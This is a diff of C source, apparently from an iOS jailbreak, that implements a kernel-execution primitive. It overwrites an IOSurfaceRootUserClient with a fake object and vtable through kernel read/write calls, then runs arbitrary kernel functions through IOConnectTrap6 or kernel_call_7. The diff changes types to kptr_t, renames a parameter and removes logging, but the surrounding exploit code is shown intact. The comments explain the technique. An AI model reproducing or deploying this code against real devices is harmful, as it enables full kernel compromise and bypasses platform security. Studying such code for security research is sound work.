@@ -30,15 +30,14 @@ static mach_port_t prepare_user_client()
         exit(EXIT_FAILURE);
     }
 
-    LOG("got user client: 0x%x", user_client);
     return user_client;
 }
 
 static mach_port_t user_client;
-static uint64_t IOSurfaceRootUserClient_port;
-static uint64_t IOSurfaceRootUserClient_addr;
-static uint64_t fake_vtable;
-static uint64_t fake_client;
+static kptr_t IOSurfaceRootUserClient_port;
+static kptr_t IOSurfaceRootUserClient_addr;
+static kptr_t fake_vtable;
+static kptr_t fake_client;
 static const int fake_kalloc_size = 0x1000;
 #endif
 static pthread_mutex_t kexecute_lock;
@@ -65,7 +64,7 @@ bool init_kexecute()
     IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
     if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) return false;
 
-    uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
+    kptr_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
     if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) return false;
 
     // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
@@ -116,12 +115,12 @@ void term_kexecute()
     pthread_mutex_destroy(&kexecute_lock);
 }
 
-uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6)
+kptr_t kexecute(kptr_t ptr, kptr_t x0, kptr_t x1, kptr_t x2, kptr_t x3, kptr_t x4, kptr_t x5, kptr_t x6)
 {
-    uint64_t returnval = 0;
+    kptr_t returnval = 0;
     pthread_mutex_lock(&kexecute_lock);
 #if __arm64e__
-    returnval = kernel_call_7(addr, 7, x0, x1, x2, x3, x4, x5, x6);
+    returnval = kernel_call_7(ptr, 7, x0, x1, x2, x3, x4, x5, x6);
 #else
     // When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
     // to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
@@ -133,15 +132,14 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
     // We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
     // (i'm not actually sure if the switch back is necessary but meh)
 
-    uint64_t offx20 = ReadKernel64(fake_client + 0x40);
-    uint64_t offx28 = ReadKernel64(fake_client + 0x48);
+    kptr_t offx20 = ReadKernel64(fake_client + 0x40);
+    kptr_t offx28 = ReadKernel64(fake_client + 0x48);
     WriteKernel64(fake_client + 0x40, x0);
-    WriteKernel64(fake_client + 0x48, addr);
+    WriteKernel64(fake_client + 0x48, ptr);
     returnval = IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
     WriteKernel64(fake_client + 0x40, offx20);
     WriteKernel64(fake_client + 0x48, offx28);
 #endif
     pthread_mutex_unlock(&kexecute_lock);
-    LOG(""ADDR"("ADDR", "ADDR", "ADDR", "ADDR", "ADDR", "ADDR", "ADDR"): "ADDR"", addr, x0, x1, x2, x3, x4, x5, x6, returnval);
     return returnval;
 }
